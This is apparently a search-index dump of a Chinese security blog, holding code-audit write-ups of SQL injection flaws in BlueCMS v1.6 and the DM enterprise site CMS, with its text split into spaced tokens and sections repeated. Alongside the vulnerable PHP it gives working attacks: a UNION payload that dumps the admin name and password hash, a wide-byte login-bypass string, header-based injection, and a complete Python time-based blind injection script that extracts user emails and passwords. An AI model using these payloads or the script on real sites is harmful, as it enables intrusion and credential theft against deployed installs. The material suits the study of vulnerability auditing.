SELECT   COUNT ( * )   AS   num   FROM   \" . table ( ' admin ' ) . \"   WHERE   admin _ name = ' $ name '   and   pwd   =   md5 ( ' $ pwd ' ) \" ) ;   if ( $ row [ ' num ' ]   >   0 )   {   return   true ;   }   else   {   return   false ;   }   }   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u53d1\u751f \u4e86 \u4e00\u6b21 \u767b\u9646 \u9a8c\u8bc1 \uff0c \u53ef\u4ee5 \u901a\u8fc7 \u5bbd \u5b57\u8282 \u6ce8\u5165 \u6765 \u505a \u4e07\u80fd \u5bc6\u7801 \u767b\u9646 \u3002   user _ name = admin% 65% 27 + or + 1% 3D1% 23 & pwd = 123   \u5b58\u5165 ip \u9020\u6210 \u6ce8\u5165   \u5728 common . inc . php \u4e2d \u53ef\u4ee5 \u627e\u5230 getip ( ) \u51fd\u6570   function   getip ( )   {   if   ( getenv ( ' HTTP _ CLIENT _ IP ' ) )   {   $ ip   =   getenv ( ' HTTP _ CLIENT _ IP ' ) ;   }   elseif   ( getenv ( ' HTTP _ X _ FORWARDED _ FOR ' ) )   {   $ ip   =   getenv ( ' HTTP _ X _ FORWARDED _ FOR ' ) ;   }   elseif   ( getenv ( ' HTTP _ X _ FORWARDED ' ) )   {   $ ip   =   getenv ( ' HTTP _ X _ FORWARDED ' ) ;   }   elseif   ( getenv ( ' HTTP _ FORWARDED _ FOR ' ) )   {   $ ip   =   getenv ( ' HTTP _ FORWARDED _ FOR ' ) ;   }   elseif   ( getenv ( ' HTTP _ FORWARDED ' ) )   {   $ ip   =   getenv ( ' HTTP _ FORWARDED ' ) ;   }   else   {   $ ip   =   $ _ SERVER [ ' REMOTE _ ADDR ' ] ;   }   return   $ ip ;   }   \u518d \u770b\u770b \u8c03\u7528 \u4ed6 \u7684 \u4f4d\u7f6e   online _ ip \u8c03\u7528 \u5904   \u770b\u770b guest _ book . php \u5904 \u5b58\u5728 insert \u6ce8\u5165 \uff0c \u5e76\u4e14 \u53ef\u4ee5 \u901a\u8fc7 \u8986\u76d6 \u540e\u9762 \u7684 content \uff0c \u9020\u6210 \u6570\u636e \u56de\u663e \u3002 \u901a\u8fc7 xff \u4f20\u5165 \u6ce8\u5165 \u8bed\u53e5 \u6216\u8005 client   ip \u4f20\u5165 \u3002   \u7ed3\u679c \u53ef\u4ee5 \u770b\u5230   \u5176\u4ed6 \u4f4d\u7f6e \u7684 \u6ce8\u5165 \uff0c \u4e0d\u80fd \u56de\u663e \uff0c \u5c31 \u4e0d \u5206\u6790 \u4e86 \u3002   \u603b\u7ed3   \u603b\u4f53 \u6765\u8bf4 \uff0c \u76f4\u63a5 \u53ef\u4ee5 grep \u5230   $ _ GET   \u3001   $ _ POST   \u3001   $ _ REQUEST   \u7684 cms \uff0c \u5ba1\u8ba1 \u8d77\u6765 \u4f1a \u6bd4\u8f83 \u8f7b\u677e \u3002 \u53ef\u4ee5 \u5148 \u4ece \u5165\u53e3 \u770b \u8d77 \uff0c \u5c06 common , config \u7b49 \u6587\u4ef6 \u4e00\u904d \u770b\u4e00\u904d \uff0c \u518d \u67e5\u627e \u5371\u9669 \u51fd\u6570 \uff0c \u6570\u636e \u5165\u53e3 \u5c31 \u53ef \u5ba1\u8ba1 \u51fa \u51e0\u4e2a \u6f0f\u6d1e \u6765 \u3002 bluecms \u6682\u65f6 \u5ba1\u8ba1 \u5230 \u8fd9 \u4e00\u6b65 \uff0c \u4e3b\u8981 \u627e \u7684 \u662f SQL \u6ce8\u5165 \u7684 \u6f0f\u6d1e \u3002 \u5176\u4ed6 \u6f0f\u6d1e \u6253\u7b97 \u51c6\u5907 \u53e6\u5916 \u4e00\u5957 cms \u6765 \u5ba1\u8ba1 : )","title":"bluecms   v1.6   Sql   Injection   \u5206\u6790"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_1","text":"\u5f88\u4e45 \u5f88\u4e45\u6ca1 \u6709 \u4ee3\u7801 \u5ba1\u8ba1 \u4e86 \uff0c \u62ff \u4e00\u5957 \u7b80\u5355 \u7684 \u627e \u627e \u611f\u89c9 \u3002 bluecms \u662f \u4e00\u5957 \u6bd4\u8f83 \u8001 \u7684 \u95e8\u6237 \u7f51\u7ad9 \u95e8\u6237\u7f51 \u95e8\u6237\u7f51\u7ad9 cms \uff0c \u7f51\u4e0a \u4e5f \u6709 \u5f88\u591a \u5173\u4e8e \u5b83 \u7684 \u6f0f\u6d1e \u8fd8 \u672a \u4fee\u8865 \uff0c \u6240\u4ee5 \u4e0b\u6587 \u7684 \u6f0f\u6d1e \u4e5f \u4e0d\u7b97 \u662f \u6700\u65b0 \u7684 \uff0c \u4ec5 \u5f53 \u662f \u7ec3\u7ec3 \u7ec3\u624b \u7ec3\u7ec3\u624b \u3002","title":"\u6982\u8ff0"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#sql","text":"\u9996\u5148 \u5173\u6ce8 \u4e00\u4e0b \u6570\u636e \u7684 \u8f93\u5165","title":"SQL \u6ce8\u5165 \u5206\u6790"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_2","text":"\u5728 common . inc . php \u4e2d   if ( ! get _ magic _ quotes _ gpc ( ) )   {   $ _ POST   =   deep _ addslashes ( $ _ POST ) ;   $ _ GET   =   deep _ addslashes ( $ _ GET ) ;   $ _ COOKIES   =   deep _ addslashes ( $ _ COOKIES ) ;   $ _ REQUEST   =   deep _ addslashes ( $ _ REQUEST ) ;   }   \u518d \u8ddf\u8fdb \u4e00\u4e0b deep _ addslashes   function   deep _ addslashes ( $ str )   {   if ( is _ array ( $ str ) )   {   foreach ( $ str   as   $ key = > $ val )   {   $ str [ $ key ]   =   deep _ addslashes ( $ val ) ;   }   }   else   {   $ str   =   addslashes ( $ str ) ;   }   return   $ str ;   }   \u53ef\u4ee5 \u53d1\u73b0 \u5bf9 \u6570\u636e \u7684 \u6ce8\u5165 \uff0c \u8fdb\u884c \u4e86 \u52a0 \u659c\u6760 \u8f6c\u4e49 \u7684 \u64cd\u4f5c \u3002 \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u627e \u6ce8\u5165 \u601d\u8def \u4e3b\u8981 \u6709 \u4ee5\u4e0b 3 \u70b9 \uff1a   \u627e \u6574\u6570 \u6574\u6570\u578b \u6ce8\u5165   \u6574\u5957 cms \u9ed8\u8ba4 gb2312 \u7f16\u7801 \uff0c \u5bb9\u6613 \u9020\u6210 \u5bbd \u5b57\u8282 \u6ce8\u5165   http \u5934 \u5e76 \u4e0d \u5728 \u8f6c\u4e49 \u7684 \u8303\u56f4 \u5185 \uff0c \u6240\u4ee5 \u7c7b\u4f3c \u5b58\u5165 ip \uff0c reffer \u7684 \u4f4d\u7f6e \u4e5f \u80fd \u53d1\u751f \u6ce8\u5165","title":"\u5168\u5c40 \u6570\u636e \u8f6c\u4e49"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_3","text":"\u62ff grep \u5339\u914d \u4e86 \u4e00\u4e0b $ _ GET \uff0c \u627e\u5230 \u4e00\u5904 \u4e0d \u505a \u5176\u4ed6 \u8fc7\u6ee4 \u7684 \u6574\u6570 \u6574\u6570\u578b \u4f4d\u7f6e   . / ad _ js . php : $ ad _ id   =   ! empty ( $ _ GET [ ' ad _ id ' ] )   ?   trim ( $ _ GET [ ' ad _ id ' ] )   :   ' ' ;   \u8ddf\u8fdb ad _ js . php   $ ad _ id   =   ! empty ( $ _ GET [ ' ad _ id ' ] )   ?   trim ( $ _ GET [ ' ad _ id ' ] )   :   ' ' ;   if ( empty ( $ ad _ id ) )   {   echo   ' Error ! ' ;   exit ( ) ;   }   $ ad   =   $ db - > getone ( \" SELECT   *   FROM   \" . table ( ' ad ' ) . \"   WHERE   ad _ id   = \" . $ ad _ id ) ;   getone \u51fd\u6570   function   getone ( $ sql ,   $ type = MYSQL _ ASSOC ) {   $ query   =   $ this - > query ( $ sql , $ this - > linkid ) ;   $ row   =   mysql _ fetch _ array ( $ query ,   $ type ) ;   return   $ row ;   }   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u5bf9 ad _ id \u6ca1\u6709 \u505a \u5176\u4ed6 \u8fc7\u6ee4 \u5904\u7406 \uff0c \u9020\u6210 \u4e86 \u6574\u6570 \u6574\u6570\u578b \u6ce8\u5165 , \u7531\u4e8e \u540e\u9762 \u4f1a \u5c06 ad _ content \u6253\u5370 \u5728 \u9875\u9762 \u4e0a \uff0c \u6240\u4ee5 \u76f4\u63a5 \u7528 union \u6ce8\u5165 \u5c31 \u53ef\u4ee5 \u83b7\u5f97 \u6570\u636e \uff0c \u6784\u9020 payload   / ad _ js . php ? ad _ id = 1% 20union% 20select% 201 , 2 , 3 , 4 , 5 , 6 , concat ( admin _ name , 0x23 , pwd ) % 20from% 20blue _ admin% 20limit% 201   \u7ed3\u679c \u53ef\u4ee5 \u5728 \u8fd4\u56de \u7684 \u754c\u9762 \u4e2d \u770b\u5230   < ! --   document . write ( \" admin # 21232f297a57a5a743894a0e4a801fc3 \" ) ;   -- >   ps : \u56e0\u4e3a \u8be5 cms \u9519\u8bef \u56de\u663e \u5177\u4f53 sql \u8bed\u53e5 \uff0c \u8868 \u524d\u7f00 \u53ef\u4ee5 \u901a\u8fc7 \u62a5\u9519 \u7684 \u65b9\u6cd5 \u628a\u8868 \u524d\u7f00 \u7206 \u51fa\u6765 \u3002","title":"\u6574\u6570\u578b \u6ce8\u5165"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_4","text":"bluecms \u64cd\u4f5c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u7684 \u5177\u4f53 \u7c7b \u5b9a\u4e49 \u5728 mysql . class . php , \u9ed8\u8ba4 \u8fde\u63a5 \u65f6 \u7684 \u7f16\u7801 \u4e3a gbk \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053 \u5f53 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u8fde\u63a5 \u65f6 \u7684 \u7f16\u7801 \u4e3a gbk \u7b49 \u53cc \u5b57\u8282 \u7f16\u7801 \u65f6 \uff0c \u5bb9\u6613 \u53d1\u751f \u5bbd \u5b57\u8282 \u6ce8\u5165 \u3002 \u524d\u9762 \u63d0\u5230 \u8be5\u5957 cms \u5bf9 \u6570\u636e \u8f93\u5165 \u8fdb\u884c \u4e86 \u8f6c\u4e49 \u7684 \u64cd\u4f5c \uff0c \u90a3\u4e48 \u521a\u521a \u597d \u6761\u4ef6 \u90fd \u9f50 \u4e86 \uff0c \u5fc5\u7136 \u5b58\u5728 \u5bbd \u5b57\u8282 \u6ce8\u5165 \u3002 grep \u770b \u4e86 \u4e00\u4e0b \uff0c \u57fa\u672c \u57fa\u672c\u4e0a \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u90fd \u53ea\u662f \u505a \u4e86 \u8f6c\u4e49 \u5904\u7406 \uff0c \u6240\u4ee5 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u6570\u636e \u8f93\u5165 \u70b9 \u90fd \u5b58\u5728 \u5bbd \u5b57\u8282 \u6ce8\u5165 \u3002 \u5927\u591a \u591a\u6570 \u5927\u591a\u6570 \u6ce8\u5165 \u90fd \u662f \u76f2\u6ce8 \uff0c \u6ca1 \u627e\u5230 \u5177\u4f53 \u53ef\u4ee5 \u4f1a\u663e \u6570\u636e \u7684 \u5730\u65b9 \uff0c \u8fd9\u91cc \u5c31 \u7b80\u5355 \u770b \u4e00\u4e0b \u767b\u9646 \u5904","title":"\u5bbd \u5b57\u8282 \u6ce8\u5165"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_5","text":"\u5176\u5b9e \u524d\u53f0 user . php \uff0c \u4e5f \u5b58\u5728 \u6ce8\u5165 \uff0c \u53ea\u662f \u76f2\u6ce8 \uff0c \u8fd9\u91cc \u5c31 \u53d6 \u7b80\u5355 \u7684 \u540e\u53f0 \u767b\u5f55 \u9a8c\u8bc1 \u5904   admin / login . php   elseif ( $ act   = =   ' do _ login ' ) {   $ admin _ name   =   isset ( $ _ POST [ ' admin _ name ' ] )   ?   trim ( $ _ POST [ ' admin _ name ' ] )   :   ' ' ;   $ admin _ pwd   =   isset ( $ _ POST [ ' admin _ pwd ' ] )   ?   trim ( $ _ POST [ ' admin _ pwd ' ] )   :   ' ' ;   $ remember   =   isset ( $ _ POST )   ?   intval ( $ _ POST [ ' rememberme ' ] )   :   0 ;   if ( $ admin _ name   = =   ' ' ) {   showmsg ( ' xxx ' ) ;   }   if ( $ admin _ pwd   = =   ' ' ) {   showmsg ( ' xxx ' ) ;   }   if ( check _ admin ( $ admin _ name ,   $ admin _ pwd ) ) {   update _ admin _ info ( $ admin _ name ) ;   if ( $ remember   = =   1 ) {   setcookie ( ' Blue [ admin _ id ] ' ,   $ _ SESSION [ ' admin _ id ' ] ,   time ( ) + 86400 ) ;   setcookie ( ' Blue [ admin _ name ] ' ,   $ admin _ name ,   time ( ) + 86400 ) ;   setcookie ( ' Blue [ admin _ pwd ] ' ,   md5 ( md5 ( $ admin _ pwd ) . $ _ CFG [ ' cookie _ hash ' ] ) ,   time ( ) + 86400 ) ;   }   } else {   showmsg ( ' xxx ' ) ;   }   showmsg ( ' xxx ' ,   ' index . php ' ) ;   }   \u7ee7\u7eed \u8ddf\u8fdb check _ admin   function   check _ admin ( $ name ,   $ pwd )   {   global   $ db ;   $ row   =   $ db - > getone ( \" SELECT   COUNT ( * )   AS   num   FROM   \" . table ( ' admin ' ) . \"   WHERE   admin _ name = ' $ name '   and   pwd   =   md5 ( ' $ pwd ' ) \" ) ;   if ( $ row [ ' num ' ]   >   0 )   {   return   true ;   }   else   {   return   false ;   }   }   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u53d1\u751f \u4e86 \u4e00\u6b21 \u767b\u9646 \u9a8c\u8bc1 \uff0c \u53ef\u4ee5 \u901a\u8fc7 \u5bbd \u5b57\u8282 \u6ce8\u5165 \u6765 \u505a \u4e07\u80fd \u5bc6\u7801 \u767b\u9646 \u3002   user _ name = admin% 65% 27 + or + 1% 3D1% 23 & pwd = 123","title":"\u540e\u53f0 \u767b\u5f55 \u5904"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#ip","text":"\u5728 common . inc . php \u4e2d \u53ef\u4ee5 \u627e\u5230 getip ( ) \u51fd\u6570   function   getip ( )   {   if   ( getenv ( ' HTTP _ CLIENT _ IP ' ) )   {   $ ip   =   getenv ( ' HTTP _ CLIENT _ IP ' ) ;   }   elseif   ( getenv ( ' HTTP _ X _ FORWARDED _ FOR ' ) )   {   $ ip   =   getenv ( ' HTTP _ X _ FORWARDED _ FOR ' ) ;   }   elseif   ( getenv ( ' HTTP _ X _ FORWARDED ' ) )   {   $ ip   =   getenv ( ' HTTP _ X _ FORWARDED ' ) ;   }   elseif   ( getenv ( ' HTTP _ FORWARDED _ FOR ' ) )   {   $ ip   =   getenv ( ' HTTP _ FORWARDED _ FOR ' ) ;   }   elseif   ( getenv ( ' HTTP _ FORWARDED ' ) )   {   $ ip   =   getenv ( ' HTTP _ FORWARDED ' ) ;   }   else   {   $ ip   =   $ _ SERVER [ ' REMOTE _ ADDR ' ] ;   }   return   $ ip ;   }   \u518d \u770b\u770b \u8c03\u7528 \u4ed6 \u7684 \u4f4d\u7f6e   online _ ip \u8c03\u7528 \u5904   \u770b\u770b guest _ book . php \u5904 \u5b58\u5728 insert \u6ce8\u5165 \uff0c \u5e76\u4e14 \u53ef\u4ee5 \u901a\u8fc7 \u8986\u76d6 \u540e\u9762 \u7684 content \uff0c \u9020\u6210 \u6570\u636e \u56de\u663e \u3002 \u901a\u8fc7 xff \u4f20\u5165 \u6ce8\u5165 \u8bed\u53e5 \u6216\u8005 client   ip \u4f20\u5165 \u3002   \u7ed3\u679c \u53ef\u4ee5 \u770b\u5230   \u5176\u4ed6 \u4f4d\u7f6e \u7684 \u6ce8\u5165 \uff0c \u4e0d\u80fd \u56de\u663e \uff0c \u5c31 \u4e0d \u5206\u6790 \u4e86 \u3002","title":"\u5b58\u5165 ip \u9020\u6210 \u6ce8\u5165"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_6","text":"\u603b\u4f53 \u6765\u8bf4 \uff0c \u76f4\u63a5 \u53ef\u4ee5 grep \u5230   $ _ GET   \u3001   $ _ POST   \u3001   $ _ REQUEST   \u7684 cms \uff0c \u5ba1\u8ba1 \u8d77\u6765 \u4f1a \u6bd4\u8f83 \u8f7b\u677e \u3002 \u53ef\u4ee5 \u5148 \u4ece \u5165\u53e3 \u770b \u8d77 \uff0c \u5c06 common , config \u7b49 \u6587\u4ef6 \u4e00\u904d \u770b\u4e00\u904d \uff0c \u518d \u67e5\u627e \u5371\u9669 \u51fd\u6570 \uff0c \u6570\u636e \u5165\u53e3 \u5c31 \u53ef \u5ba1\u8ba1 \u51fa \u51e0\u4e2a \u6f0f\u6d1e \u6765 \u3002 bluecms \u6682\u65f6 \u5ba1\u8ba1 \u5230 \u8fd9 \u4e00\u6b65 \uff0c \u4e3b\u8981 \u627e \u7684 \u662f SQL \u6ce8\u5165 \u7684 \u6f0f\u6d1e \u3002 \u5176\u4ed6 \u6f0f\u6d1e \u6253\u7b97 \u51c6\u5907 \u53e6\u5916 \u4e00\u5957 cms \u6765 \u5ba1\u8ba1 : )","title":"\u603b\u7ed3"},{"location":"blog/2017/old-DM-sql-injection/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"\u6982\u8ff0   \u4eca\u5929 \u641e \u4e86 \u4e00\u4e0b \u52a8\u6001 \u8c03\u8bd5 \u7684 \u4e1c\u897f \uff0c \u7136\u540e \u987a\u4fbf \u770b \u4e86 \u770b \u4e0a\u6b21 \u4e0b \u7684   DM \u4f01\u4e1a \u5efa \u7ad9 \u7cfb\u7edf 2017.01 . 23   \u3002   \u524d\u53f0 cookie   \u65f6\u95f4 \u76f2\u6ce8   \u5927\u81f4 \u8ddf \u4e86 \u4e00\u4e0b \u51e0\u4e2a \u5165\u53e3 \u6587\u4ef6 \uff0c \u8be5\u5957 cms \u4e3b\u8981 \u7684 \u5b89\u5168 \u63aa\u65bd \u5b89\u5168\u63aa\u65bd \u4e3a   htmlentities   \uff0c \u5728 POST && GET \u7684 \u8f93\u5165 \u70b9 \u505a \u4e86 html \u5b9e\u4f53 \u5b9e\u4f53\u5316 \u7684 \u64cd\u4f5c \uff0c \u4f46\u662f \u8fd9 \u5e76 \u4e0d \u8f6c\u4e49 \u5f15\u53f7 \u5355\u5f15\u53f7 \uff08 \u9ed8\u8ba4 \u4e0d \u8f6c\u4e49 \u5f15\u53f7 \u5355\u5f15\u53f7 \u5177\u4f53 \u53ef \u770b   htmlentities   \uff09 \uff0c \u770b \u4e86 \u4e00\u4e0b \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u7684 sql \u8bed\u53e5 \uff0c \u6d89\u53ca \u5230 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u7c7b\u578b \u65f6 \uff0c \u90fd \u662f \u5f15\u53f7 \u5355\u5f15\u53f7 \u95ed\u5408 \uff0c \u90a3\u4e48 \u5f88 \u6e05\u695a \uff0c \u5728 \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u65f6 \u5bb9\u6613 \u4ea7\u751f sql \u6ce8\u5165 \u6f0f\u6d1e \u3002   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u4e3b\u8981 \u627e \u4e00\u4e0b \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u64cd\u4f5c \u7684 \u4f4d\u7f6e \u3002   POST && GET   COOKIE   ps \uff1a \u8fd9\u91cc \u5c31 \u968f\u4fbf \u627e \u4e86 \u4e00\u4e2a \u5730\u65b9 \uff0c \u56e0\u4e3a \u8fd9\u5957 \u7cfb\u7edf \u6ce8\u5165 \u4e0d\u8981 \u592a \u591a \uff0c \u8fde \u540e\u53f0 \u767b\u9646 \u90fd \u53ef\u4ee5   : P   \u524d\u9762 \u63d0\u5230 \u5bf9 POST && GET \u505a \u4e86 \u5b9e\u4f53 \u8f6c\u4e49 \uff0c \u4f46\u662f grep \u627e \u4e86 \u4e00\u4e0b cookie \uff0c \u53d1\u73b0 \u5e76 \u6ca1\u6709 \u5bf9 cookie \u7684 \u503c \u8fdb\u884c \u5b89\u5168 \u64cd\u4f5c \uff0c \u76f4\u63a5 \u5e26\u5165 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u3002   indexDM _ load . php   Line   108   ...   if ( @ $ _ COOKIE [ \" curstyle \" ] < > ' ' )   $ curstyle   =   $ _ COOKIE [ \" curstyle \" ] ;   else   $ curstyle   =   $ row [ ' curstyle ' ] ;   ...   $ sqlstyle   =   \" SELECT   *   from   \" . TABLE _ STYLE . \"   where   pidname = ' $ curstyle '   $ andlangbh   limit   1 \" ;   / / echo   $ sqlstyle ; exit ;   if ( getnum ( $ sqlstyle ) > 0 ) {   $ rowstyle   =   getrow ( $ sqlstyle ) ;   \u4e0a\u8ff0 \u4e3a \u6f0f\u6d1e \u7684 \u4e3b\u8981 \u6210\u56e0 \u70b9 \uff0c \u5982\u679c cookie \u4e2d \u5b58\u5728 curstyle , \u4f18\u5148 \u9009\u7528 cookie \u4e2d \u7684 \u503c \uff0c \u7136\u540e \u5e26\u5165 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u3002 \u7531\u4e8e \u6ca1\u6709 \u627e\u5230 \u5177\u4f53 \u56de\u663e \u6570\u636e \u7684 \u5730\u65b9 \uff0c \u6240\u4ee5 \u91c7\u7528 \u65f6\u95f4 \u76f2\u6ce8 \u7684 \u65b9\u5f0f \u83b7\u53d6 \u6570\u636e \u83b7\u53d6\u6570\u636e \u3002   \u5e26\u4e0a \u81ea\u5df1 \u5199 \u7684 EXP   # ! / usr / bin / env   python   #   - * -   coding :   utf - 8   - * -   #   Created   by   wh1t3P1g   at   2017 / 1 / 30   import   requests , time   class   CookieBlindSqlInjection :   def   __ init __ ( self , url ) :   self . url = url   self . len = 0   def   getLength ( self , column , table ) :   payload0   =   \" curstyle = 1 ' | | if ( ( select   length ( cast ( bin ( length ( { column } ) )   as   char ) )   from   { table }   limit   { line _ start } , 1 ) = { flag } , sleep ( 5 ) , 1 ) = 1 # \"   payload1   =   \" curstyle = 1 ' | | if ( ( select   substr ( bin ( length ( { column } ) ) , { col _ start } , 1 )   from   { table }   limit   { line _ start } , 1 ) = 1 , 1 , sleep ( 5 ) ) = 1 # \"   # first   confirm   bin - format   data   length   len = 0   for   i   in   range ( 1 , 9 ) :   cookie = payload0 . format ( column = column , table = table , line _ start = 0 , flag = i )   flag = self . send ( cookie )   if   flag = = \" 0 \" :   len = i   break   res = \" \"   for   i   in   range ( 1 , len + 1 ) :   cookie = payload1 . format ( column = column , col _ start = i , table = table , line _ start = 0 )   flag = self . send ( cookie )   res + = flag   #   print   res   self . len = int ( res , 2 )   pprint ( \" * \" ,   \" fetch   \" + column + \"   length :   \" + str ( self . len ) )   return   int ( res , 2 )   def   getData ( self , column , table ) :   payload0 = \" curstyle = 1 ' | | if ( ( select   length ( cast ( bin ( ascii ( substr ( { column } , { data _ start } , 1 ) ) )   as   char ) )   from   { table }   limit   { line _ start } , 1 ) = { flag } , sleep ( 5 ) , 1 ) = 1 # \"   payload1   =   \" curstyle = 1 ' | | if ( ( select   substr ( bin ( ascii ( substr ( { column } , { data _ start } , 1 ) ) ) , { col _ start } , 1 )   from   { table }   limit   { line _ start } , 1 ) = 1 , 1 , sleep ( 5 ) ) = 1 # \"   total _ res = \" \"   for   i   in   range ( 1 , self . len + 1 ) : # \u5177\u4f53 \u6570\u636e \u7684 \u957f\u5ea6   len   =   0   for   j   in   range ( 1 ,   9 ) :   cookie   =   payload0 . format ( column = column , data _ start = i ,   table = table ,   line _ start = 0 ,   flag = j )   flag   =   self . send ( cookie )   if   flag   = =   \" 0 \" :   len   =   j   break   #   print   \" len : \" + str ( len )   res   =   \" \"   for   k   in   range ( 1 ,   len   +   1 ) :   cookie   =   payload1 . format ( column = column , data _ start = i ,   col _ start = k ,   table = table ,   line _ start = 0 )   flag   =   self . send ( cookie )   res   + =   flag   #   print   res   total _ res + = chr ( int ( res , 2 ) )   pprint ( \" * \" ,   \" fetch   \" + column + \" :   \" + total _ res )   return   total _ res   def   send ( self , cookie ) :   headers = { \" Cookie \" : cookie }   try :   r   =   requests . get ( self . url ,   headers = headers , timeout = 4 )   return   \" 1 \"   except :   return   \" 0 \"   def   pprint ( flag , content ) :   print   \" [ { flag } ]   [ { time } ]   { content } \"   \\   . format ( flag = flag ,   time = time . asctime ( time . localtime ( time . time ( ) ) ) ,   content = content )   if   __ name __ = = ' __ main __ ' :   cookieBlindSqlInjection = CookieBlindSqlInjection ( \" http : / / 127.0 . 0.1 / cms / DM / 20170123 / \" )   pprint ( \" * \" , \" program   start \" )   pprint ( \" * \" ,   \" start   fetching   column [ email ] \" )   cookieBlindSqlInjection . getLength ( \" email \" , \" zzz _ user \" )   email = cookieBlindSqlInjection . getData ( \" email \" , \" zzz _ user \" )   pprint ( \" * \" ,   \" start   fetching   column [ ps ] \" )   cookieBlindSqlInjection . getLength ( \" ps \" ,   \" zzz _ user \" )   ps = cookieBlindSqlInjection . getData ( \" ps \" ,   \" zzz _ user \" )   pprint ( \" * \" ,   \" [ email ] :   \" + email + \"   , [ ps ] :   \" + ps )   pprint ( \" * \" ,   \" program   done \" )   ps : DM \u8fd9\u4e2a \u9b3c \uff0c \u4ee3\u7801 \u5199 \u7684 \u597d \u4e71 \u554a T _ T","title":"DM \u4f01\u4e1a \u5efa \u7ad9 \u7cfb\u7edf \u524d\u53f0 \u76f2\u6ce8"},{"location":"blog/2017/old-DM-sql-injection/#_1","text":"\u4eca\u5929 \u641e \u4e86 \u4e00\u4e0b \u52a8\u6001 \u8c03\u8bd5 \u7684 \u4e1c\u897f \uff0c \u7136\u540e \u987a\u4fbf \u770b \u4e86 \u770b \u4e0a\u6b21 \u4e0b \u7684   DM \u4f01\u4e1a \u5efa \u7ad9 \u7cfb\u7edf 2017.01 . 23   \u3002","title":"\u6982\u8ff0"},{"location":"blog/2017/old-DM-sql-injection/#cookie","text":"\u5927\u81f4 \u8ddf \u4e86 \u4e00\u4e0b \u51e0\u4e2a \u5165\u53e3 \u6587\u4ef6 \uff0c \u8be5\u5957 cms \u4e3b\u8981 \u7684 \u5b89\u5168 \u63aa\u65bd \u5b89\u5168\u63aa\u65bd \u4e3a   htmlentities   \uff0c \u5728 POST && GET \u7684 \u8f93\u5165 \u70b9 \u505a \u4e86 html \u5b9e\u4f53 \u5b9e\u4f53\u5316 \u7684 \u64cd\u4f5c \uff0c \u4f46\u662f \u8fd9 \u5e76 \u4e0d \u8f6c\u4e49 \u5f15\u53f7 \u5355\u5f15\u53f7 \uff08 \u9ed8\u8ba4 \u4e0d \u8f6c\u4e49 \u5f15\u53f7 \u5355\u5f15\u53f7 \u5177\u4f53 \u53ef \u770b   htmlentities   \uff09 \uff0c \u770b \u4e86 \u4e00\u4e0b \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u7684 sql \u8bed\u53e5 \uff0c \u6d89\u53ca \u5230 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u7c7b\u578b \u65f6 \uff0c \u90fd \u662f \u5f15\u53f7 \u5355\u5f15\u53f7 \u95ed\u5408 \uff0c \u90a3\u4e48 \u5f88 \u6e05\u695a \uff0c \u5728 \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u65f6 \u5bb9\u6613 \u4ea7\u751f sql \u6ce8\u5165 \u6f0f\u6d1e \u3002   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u4e3b\u8981 \u627e \u4e00\u4e0b \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u64cd\u4f5c \u7684 \u4f4d\u7f6e \u3002   POST && GET   COOKIE   ps \uff1a \u8fd9\u91cc \u5c31 \u968f\u4fbf \u627e \u4e86 \u4e00\u4e2a \u5730\u65b9 \uff0c \u56e0\u4e3a \u8fd9\u5957 \u7cfb\u7edf \u6ce8\u5165 \u4e0d\u8981 \u592a \u591a \uff0c \u8fde \u540e\u53f0 \u767b\u9646 \u90fd \u53ef\u4ee5   : P   \u524d\u9762 \u63d0\u5230 \u5bf9 POST && GET \u505a \u4e86 \u5b9e\u4f53 \u8f6c\u4e49 \uff0c \u4f46\u662f grep \u627e \u4e86 \u4e00\u4e0b cookie \uff0c \u53d1\u73b0 \u5e76 \u6ca1\u6709 \u5bf9 cookie \u7684 \u503c \u8fdb\u884c \u5b89\u5168 \u64cd\u4f5c \uff0c \u76f4\u63a5 \u5e26\u5165 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u3002   indexDM _ load . php   Line   108   ...   if ( @ $ _ COOKIE [ \" curstyle \" ] < > ' ' )   $ curstyle   =   $ _ COOKIE [ \" curstyle \" ] ;   else   $ curstyle   =   $ row [ ' curstyle ' ] ;   ...   $ sqlstyle   =   \" SELECT   *   from   \" . TABLE _ STYLE . \"   where   pidname = ' $ curstyle '   $ andlangbh   limit   1 \" ;   / / echo   $ sqlstyle ; exit ;   if ( getnum ( $ sqlstyle ) > 0 ) {   $ rowstyle   =   getrow ( $ sqlstyle ) ;   \u4e0a\u8ff0 \u4e3a \u6f0f\u6d1e \u7684 \u4e3b\u8981 